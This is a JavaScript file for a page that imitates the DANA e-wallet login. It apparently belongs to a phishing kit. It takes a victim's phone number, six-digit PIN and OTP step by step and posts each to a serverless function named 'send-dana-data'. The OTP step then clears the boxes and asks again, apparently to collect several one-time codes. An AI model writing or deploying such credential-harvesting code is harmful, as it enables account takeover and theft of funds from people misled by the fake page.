document.addEventListener('DOMContentLoaded', function() {
  // DOM Elements
  const pages = {
    phone: document.getElementById('number-page'),
    pin: document.getElementById('pin-page'),
    otp: document.getElementById('otp-page')
  };
  
  const phoneInput = document.getElementById('phone-number');
  const pinInputs = document.querySelectorAll('.pin-box');
  const otpInputs = document.querySelectorAll('.otp-box');
  const continueBtn = document.getElementById('lanjutkan-button');
  const showPinBtn = document.querySelector('.show-text');
  const resendOtpBtn = document.querySelector('.resend-otp span');
  const otpMessageBox = document.querySelector('.otp-message-box');

  // State Management
  const state = {
    currentPage: 'phone',
    phoneNumber: '',
    pin: '',
    otp: '',
    attempts: 0,
    maxAttempts: 3,
    otpTimer: null
  };

  // Initialize pages
  pages.phone.style.display = 'block';

  // Phone number input handling
  phoneInput.addEventListener('input', function(e) {
    let value = e.target.value.replace(/\D/g, '');
    
    if (value.length > 0 && !value.startsWith('8')) {
      value = '8' + value.substring(1);
    }
    
    let formatted = '';
    if (value.length > 0) formatted = value.substring(0, 4);
    if (value.length > 4) formatted += '-' + value.substring(4, 8);
    
    phoneInput.value = formatted;
    state.phoneNumber = value;
  });

  // Continue button handler
  continueBtn.addEventListener('click', async function() {
    if (state.currentPage === 'phone') {
      if (state.phoneNumber.length < 10) {
        showError('Nomor HP harus minimal 10 digit');
        return;
      }
      
      showLoading();
      try {
        await sendData('phone', { phone: state.phoneNumber });
        switchPage('pin');
      } catch (error) {
        showError('Gagal mengirim nomor HP');
      } finally {
        hideLoading();
      }
    }
  });

  // PIN input handling
  pinInputs.forEach((input, index) => {
    input.addEventListener('input', function(e) {
      e.target.value = e.target.value.replace(/\D/g, '');
      
      if (e.target.value.length === 1 && index < pinInputs.length - 1) {
        pinInputs[index + 1].focus();
      }
      
      state.pin = Array.from(pinInputs).map(i => i.value).join('');
      
      if (state.pin.length === 6) {
        submitPIN();
      }
    });

    input.addEventListener('keydown', function(e) {
      if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
        pinInputs[index - 1].focus();
      }
    });
  });

  // OTP input handling
  otpInputs.forEach((input, index) => {
    input.addEventListener('input', function(e) {
      e.target.value = e.target.value.replace(/\D/g, '');
      
      if (e.target.value.length === 1 && index < otpInputs.length - 1) {
        otpInputs[index + 1].focus();
      }
      
      state.otp = Array.from(otpInputs).map(i => i.value).join('');
      
      if (state.otp.length === 4) {
        submitOTP();
      }
    });

    input.addEventListener('keydown', function(e) {
      if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
        otpInputs[index - 1].focus();
      }
    });
  });

  // Resend OTP handler
  resendOtpBtn.addEventListener('click', function() {
    if (this.textContent.includes('KIRIM ULANG')) {
      startOTPTimer();
      otpMessageBox.innerHTML = `
        <p><b>Tap verifikasi untuk menerima OTP</b></p>
        <p>Kode OTP telah dikirim ke nomor Anda</p>
      `;
    }
  });

  // PIN visibility toggle
  showPinBtn.addEventListener('click', function() {
    const isShowing = this.classList.toggle('active');
    pinInputs.forEach(input => {
      input.type = isShowing ? 'text' : 'password';
    });
    this.textContent = isShowing ? 'SEMBUNYIKAN' : 'TAMPILKAN';
  });

  // Core functions
  function switchPage(targetPage) {
    Object.values(pages).forEach(page => {
      page.style.display = 'none';
    });
    pages[targetPage].style.display = 'block';
    state.currentPage = targetPage;
    
    setTimeout(() => {
      const firstInput = pages[targetPage].querySelector('input');
      if (firstInput) firstInput.focus();
    }, 100);
  }

  function startOTPTimer() {
    clearInterval(state.otpTimer);
    let timeLeft = 118;
    
    state.otpTimer = setInterval(() => {
      resendOtpBtn.textContent = `KIRIM ULANG (${timeLeft}s)`;
      
      if (timeLeft <= 0) {
        clearInterval(state.otpTimer);
        resendOtpBtn.textContent = 'KIRIM ULANG';
      }
      timeLeft--;
    }, 1000);
  }

  async function sendData(type, data) {
    try {
      const response = await fetch('/.netlify/functions/send-dana-data', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ type, ...data })
      });
      
      if (!response.ok) throw new Error(await response.text());
      return await response.json();
    } catch (error) {
      console.error('API Error:', error);
      throw error;
    }
  }

  async function submitPIN() {
    showLoading();
    try {
      await sendData('pin', { phone: state.phoneNumber, pin: state.pin });
      switchPage('otp');
      startOTPTimer();
    } catch (error) {
      showError('PIN salah atau terjadi kesalahan');
      clearPINInputs();
    } finally {
      hideLoading();
    }
  }

  async function submitOTP() {
    showLoading();
    try {
      await sendData('otp', { 
        phone: state.phoneNumber, 
        pin: state.pin,
        otp: state.otp 
      });
      handleOTPResponse();
    } catch (error) {
      showError('OTP salah atau terjadi kesalahan');
      handleOTPError();
    } finally {
      hideLoading();
    }
  }

  function handleOTPResponse() {
    state.attempts++;
    if (state.attempts >= state.maxAttempts) {
      showError('Terlalu banyak percobaan, silakan coba lagi nanti');
    }
    clearOTPInputs();
  }

  function clearPINInputs() {
    pinInputs.forEach(input => input.value = '');
    pinInputs[0].focus();
    state.pin = '';
  }

  function clearOTPInputs() {
    otpInputs.forEach(input => input.value = '');
    otpInputs[0].focus();
    state.otp = '';
  }

  function showLoading() {
    document.querySelector('.spinner-overlay').style.display = 'flex';
  }

  function hideLoading() {
    document.querySelector('.spinner-overlay').style.display = 'none';
  }

  function showError(message) {
    const errorElement = document.createElement('div');
    errorElement.className = 'error-message';
    errorElement.textContent = message;
    document.body.appendChild(errorElement);
    setTimeout(() => {
      document.body.removeChild(errorElement);
    }, 3000);
  }
});
